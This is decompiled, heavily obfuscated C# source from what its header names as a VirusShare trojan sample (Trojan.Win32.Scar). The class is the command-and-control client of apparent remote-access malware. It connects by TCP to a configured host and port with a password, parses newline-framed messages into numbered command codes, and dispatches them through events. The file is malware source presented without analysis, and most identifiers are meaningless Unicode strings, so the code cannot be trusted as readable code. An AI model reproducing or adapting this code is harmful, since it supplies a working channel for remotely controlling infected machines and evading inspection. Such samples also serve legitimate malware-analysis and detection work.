// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.ᬩ๶ᎈÁጹʋ
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  internal class ᬩ\u0E76ᎈÁጹʋ
  {
    private Socket ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ;
    private IPAddress \u060Eសŉტཛှთ\u0D73\u1758ૡI;
    private bool \u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ;
    private Thread ܖ\u08C8\u003E\u1317५န\u1759ݐІጯ\u0D81ᣖ;
    private Thread \u0743ᴪᒽ؀ᩅፕሴᅢঋȉ\u1CBCƂᇔᒈ᠒ᰖឫ;
    private string Ӷؙᦍᡲᐟ\u1AA3៎;
    private int ಅᤊ\u0ADBઆ᭙Ξ\u0AFAૉӂᨥᴈᇗྦᑬṎṰ\u1CCAۄ;
    private string ᆙᛖ\u1ACCẆ\u0A79ச;

    public ᬩ\u0E76ᎈÁጹʋ(string Host, int Port, string Password)
    {
      this.Ӷؙᦍᡲᐟ\u1AA3៎ = Host;
      this.ಅᤊ\u0ADBઆ᭙Ξ\u0AFAૉӂᨥᴈᇗྦᑬṎṰ\u1CCAۄ = Port;
      this.ᆙᛖ\u1ACCẆ\u0A79ச = Password;
    }

    public Socket \u139C\u193Dᑆͩ᭰ => this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ;

    public IPAddress \u0AEEᕥזۡื => this.\u060Eសŉტཛှთ\u0D73\u1758ૡI;

    public bool \u0F6Fǀ̋ṙٛުፂ\u1AC3ᜤ => this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ;

    public string \u001AḮෑᮑؘ\u1B5DᮄА => this.Ӷؙᦍᡲᐟ\u1AA3៎;

    public int Հዶᩮ\u1C39ݛ൯y\u0028឴੮ևݿຯᨚ => this.ಅᤊ\u0ADBઆ᭙Ξ\u0AFAૉӂᨥᴈᇗྦᑬṎṰ\u1CCAۄ;

    public string Έᐋೊᕺறᎃ\u139DΟ\u0A34 => this.ᆙᛖ\u1ACCẆ\u0A79ச;

    public void \u0E4AOಉሩណई() => this.\u0A42ႏ\u0866ᢉ\u0608\u0A0B೫();

    private void \u0A42ႏ\u0866ᢉ\u0608\u0A0B೫()
    {
      if (this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ)
        return;
      try
      {
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.BeginConnect(this.Ӷؙᦍᡲᐟ\u1AA3៎, this.ಅᤊ\u0ADBઆ᭙Ξ\u0AFAૉӂᨥᴈᇗྦᑬṎṰ\u1CCAۄ, new AsyncCallback(this.ᛩ͒\u0B98ͱɆၣᨔʌআᏧᔢᓜ), (object) this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ);
      }
      catch
      {
      }
    }

    private void ᵕቢľࣣἿᘿ੧()
    {
      if (this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ)
        return;
      this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ = true;
      if (this.\u088F\u12C1\u00BDฐएᥙ\u0D71\u1DF7\u06D4ᡩڌ == null)
        return;
      this.\u088F\u12C1\u00BDฐएᥙ\u0D71\u1DF7\u06D4ᡩڌ((object) this, (EventArgs) null);
    }

    private void ᛩ͒\u0B98ͱɆၣᨔʌআᏧᔢᓜ(IAsyncResult _param1)
    {
      try
      {
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.EndConnect(_param1);
        if (!this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Connected)
          throw new SocketException();
        this.ᵕቢľࣣἿᘿ੧();
      }
      catch
      {
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Close();
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ = (Socket) null;
        this.\u060Eសŉტཛှთ\u0D73\u1758ૡI = (IPAddress) null;
        if (this.\u05EFᤢᗈܐ\u0FCAᴬṎיᗈ\u0FC9\u070Aᩜ\u1AE8ൟ៦غҼჹᧄ == null)
          return;
        this.\u05EFᤢᗈܐ\u0FCAᴬṎיᗈ\u0FC9\u070Aᩜ\u1AE8ൟ៦غҼჹᧄ((object) this, (EventArgs) null);
      }
    }

    public void \u1060Īểਜ਼ʋಁϧ\u0F2FḲܿܣᦍᖴᚉજ()
    {
      this.ܖ\u08C8\u003E\u1317५န\u1759ݐІጯ\u0D81ᣖ = new Thread(new ThreadStart(this.ၰᮓᄯఇ\u001B\u02DE۱ȴ\u0E6Cᚅᐈ៨ኻݸ));
      this.ܖ\u08C8\u003E\u1317५န\u1759ݐІጯ\u0D81ᣖ.Start();
    }

    private void ၰᮓᄯఇ\u001B\u02DE۱ȴ\u0E6Cᚅᐈ៨ኻݸ()
    {
      try
      {
        MemoryStream ms = new MemoryStream();
        byte[] array;
        do
        {
          array = new byte[this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.ReceiveBufferSize];
          int num = this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Receive(array, 0, array.Length, SocketFlags.Partial);
          if (num <= 0)
            throw new SocketException();
          Array.Resize<byte>(ref array, num);
          ms.Write(array, 0, num);
        }
        while (!(char.ConvertFromUtf32((int) array[array.Length - 1]) == "\n"));
        ms.Close();
        new Thread((ThreadStart) (() =>
        {
          this.ᑦฅ\u139C\u0B4A\u128Fึù\u09E5ᱚ᩼ể̚ण\u169Eވз᪻ྫ(ms.ToArray());
          ms.Dispose();
          ms = (MemoryStream) null;
        })).Start();
      }
      catch (SocketException ex)
      {
        this.ᑌהᜌᅄ\u1CC1ዎ\u1AD4\u0A4Eឭབᱷ(true);
        return;
      }
      catch (ObjectDisposedException ex)
      {
        this.ᑌהᜌᅄ\u1CC1ዎ\u1AD4\u0A4Eឭབᱷ(true);
        return;
      }
      catch (NullReferenceException ex)
      {
        this.ᑌהᜌᅄ\u1CC1ዎ\u1AD4\u0A4Eឭབᱷ(true);
        return;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      this.ၰᮓᄯఇ\u001B\u02DE۱ȴ\u0E6Cᚅᐈ៨ኻݸ();
    }

    private void ᑦฅ\u139C\u0B4A\u128Fึù\u09E5ᱚ᩼ể̚ण\u169Eވз᪻ྫ(byte[] _param1)
    {
      List<byte> byteList = new List<byte>();
      for (int index = 0; index < _param1.Length; ++index)
      {
        if (char.ConvertFromUtf32((int) _param1[index]) != "\n")
        {
          byteList.Add(_param1[index]);
        }
        else
        {
          this.ሹࠆೡ̙\u1379֟\u1CC9\u05FCѽୣǹÝ\u0A7Fጂঅᱠฒ(byteList.ToArray());
          byteList.Clear();
        }
      }
    }

    private void ሹࠆೡ̙\u1379֟\u1CC9\u05FCѽୣǹÝ\u0A7Fጂঅᱠฒ(byte[] _param1)
    {
      MemoryStream memoryStream = new MemoryStream(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.ᘞϷ\u0AF7ᨡᴰ\u1774ੋ\u0BACߓᕲ\u008FẲУ͔ȴڊਸ਼\u0B5B(_param1, true));
      byte[] buffer = new byte[4];
      memoryStream.Read(buffer, 0, buffer.Length);
      ᬩ\u0E76ᎈÁጹʋ.\u1940ᔛᷥت\u001Eᛖḓᶐ int32 = (ᬩ\u0E76ᎈÁጹʋ.\u1940ᔛᷥت\u001Eᛖḓᶐ) BitConverter.ToInt32(buffer, 0);
      byte[] numArray = new byte[memoryStream.Length - 4L];
      memoryStream.Read(numArray, 0, numArray.Length);
      memoryStream.Close();
      memoryStream.Dispose();
      if (this.ᙽ\u1806\u0BBB֡ቧ\u1AEFŸ != null)
        this.ᙽ\u1806\u0BBB֡ቧ\u1AEFŸ((object) this, new ѱܐ\u0AF4૧ڰᱧ᠙\u173Fѯᗃᕲྃ\u169E\u0879௧Ͽः(numArray, numArray.Length, int32));
      _param1 = (byte[]) null;
    }

    public int ğᢼ୫ݪᙦྣӢᨄ\u0B51Ἔᩉ෮\u0875ͱ\u07BBᡪף(byte[] _param1)
    {
      try
      {
        int sent = this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Send(_param1, 0, _param1.Length, SocketFlags.Partial) + this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Send(this.\u1928ᕗᓗ\u1F1Fᨑ໑ᤡǊᅙࣻ, 0, 1, SocketFlags.Partial);
        if (this.ᄛγѪჯගש៩᷅Ù\u08DFᬐ\u0FCBଆŞ୪ != null && sent != 0)
          this.ᄛγѪჯගש៩᷅Ù\u08DFᬐ\u0FCBଆŞ୪((object) this, new ᮋࡄ\u0F2D\u19DBᴿ(sent));
        return sent;
      }
      catch
      {
        return 0;
      }
    }

    private byte[] \u1928ᕗᓗ\u1F1Fᨑ໑ᤡǊᅙࣻ => Encoding.ASCII.GetBytes("\n");

    public void ѳၷ\u09F8ᔈ̴̳\u0EFC\u187B\u08D8M\u0EAC\u1C85(string _param1)
    {
      ड़ᜋᵦ\u1B5Fት\u086A\u1CABᢒচɗ ड़ᜋᵦትᢒচɗ = new ड़ᜋᵦ\u1B5Fት\u086A\u1CABᢒচɗ();
      ड़ᜋᵦትᢒচɗ.Write(_param1);
      this.ğᢼ୫ݪᙦྣӢᨄ\u0B51Ἔᩉ෮\u0875ͱ\u07BBᡪף(new ᕳäலॅш\u0AFFໟࠈ\u0860Ḯޮᬃྵᵬᩖᚵ(ᬩ\u0E76ᎈÁጹʋ.\u1940ᔛᷥت\u001Eᛖḓᶐ.ਠ़ᝤྀ\u1AA9ݍፌॆᭈጃ\u0D55\u0E69ރοᦟᒘ༩ᩐ, ड़ᜋᵦትᢒচɗ.\u1B6Fᤢ\u08C9\u083CԢʩἣ\u0E62ýडᛔቼᢹ\u0ABAĤᇱ()).\u0860ữ\u00A8w̉ᯔႅ\u08E1\u1C7FԦ());
    }

    public bool ᑌהᜌᅄ\u1CC1ዎ\u1AD4\u0A4Eឭབᱷ(bool _param1)
    {
      if (!this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ)
        return false;
      this.ݽ᧖\u1AEDཌྷՎྕ();
      this.\u1ADD\u0BA6ֹ\u1C95ᄤሦງཉᄛҐ\u05CFఀ\u180Fኅ្બ\u0882ᅃ = false;
      if (_param1 && this.ḫ๙ᩎ\u1778ਐ != null)
        this.ḫ๙ᩎ\u1778ਐ((object) this, (EventArgs) null);
      return true;
    }

    public void ݽ᧖\u1AEDཌྷՎྕ()
    {
      try
      {
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ.Close();
        this.ᑀӆ\u1AEFხקއ\u1ACDၚᆢ\u00BFႫИщ᠎ᅍ = (Socket) null;
      }
      catch
      {
      }
      try
      {
        this.ܖ\u08C8\u003E\u1317५န\u1759ݐІጯ\u0D81ᣖ.Abort();
        this.ܖ\u08C8\u003E\u1317५န\u1759ݐІጯ\u0D81ᣖ = (Thread) null;
      }
      catch
      {
      }
      try
      {
        this.\u0743ᴪᒽ؀ᩅፕሴᅢঋȉ\u1CBCƂᇔᒈ᠒ᰖឫ.Abort();
        this.\u0743ᴪᒽ؀ᩅፕሴᅢঋȉ\u1CBCƂᇔᒈ᠒ᰖឫ = (Thread) null;
      }
      catch
      {
      }
    }

    public event EventHandler ConnectionAccepted;

    public event EventHandler ConnectionFailed;

    public event EventHandler Disconnected;

    public event EventHandler<ᮋࡄ\u0F2D\u19DBᴿ> Sent;

    public event EventHandler<ѱܐ\u0AF4૧ڰᱧ᠙\u173Fѯᗃᕲྃ\u169E\u0879௧Ͽः> Received;

    public enum \u1940ᔛᷥت\u001Eᛖḓᶐ
    {
      \u0BC1ѴΏᕫɀᱮ = 0,
      \u17C1݄ᇄᶫृ\u0A0B\u1CC0ዋᄭᒇညіᆤᗙચ̮ = 1,
      \u0E69ᆬᰒԔ༨վᄭ۳ỻᯋᇓ៏ᖍᗪᡥ = 2,
      യরᤡ\u0FF3\u1DF7͌ԅ = 3,
      ŪᐊϨзᐙռளīŋඊ\u0706 = 4,
      \u0060ᇟ\u089EǊ\u009Bᚼই\u0D80\u0AF2ᨻ\u1AE0ᷜ = 5,
      \u0015ѺమႹቺᚍଡಫ\u0F2Fήᩝƛ\u0CFAሚᦃ = 6,
      Ⴌᚉࠇ\u0EE9\u0896Ϫ\u1A8FĖ\u175Bཛྷܿᤄ = 7,
      ǻٮᡪՋಒᐈćễྲฐᘽᬤ̭ၱี = 8,
      \u0034ዡҧང\u1CA3ᦅηዝ\u0EF8๓᭫ = 9,
      ᤘఖ\u1AA0ŴӝȱĦɷᱣಊ\u0F0C੩ᐱ\u05F8ᡫᐼᡪ\u171B = 15, // 0x0000000F
      ଝᢝ̣ནᅝᔥഹ\u1C80Ǹ = 16, // 0x00000010
      lᵒᢁ႗þ\u087Dᄊጄխኸ\u0C5Eዕᜬᮻʝ\u09C5ᥢ\u07B5 = 17, // 0x00000011
      \u0592ᖓᵿៜ\u171CᎭ = 18, // 0x00000012
      \u0AF2ۯৌൈ̽ჵ\u0B8DϤቹڔᘂ\u0C11ᢌ᩹Ǘ = 19, // 0x00000013
      \u08EB\u08B8ᰌជŵڧ\u0CBAޜᬃ\u0588ᧈᮥ؁ȭջŪᰪ৩ = 20, // 0x00000014
      ਠ़ᝤྀ\u1AA9ݍፌॆᭈጃ\u0D55\u0E69ރοᦟᒘ༩ᩐ = 21, // 0x00000015
      ᓤяᥴȵᆅ᳴\u166D༧ᴣၐĞᒜ༧ວ᳭ᛷᇼ\u10C6 = 22, // 0x00000016
      Ũဿ൩\u1CA1ႲᏘ\u0DB2ᙟቊ\u17EA\u0BA2ೕᖒٚÉᑅ = 23, // 0x00000017
      \u0FEB\u070Cפᇌрᝥᕩᠶᨮᶦᵮἁ\u09D5ఈިϖ = 24, // 0x00000018
      ᣭଫހۮ\u08C6ගϘڙЧᙼᆅ\u0380ૌ็\u0E63 = 25, // 0x00000019
    }
  }
}
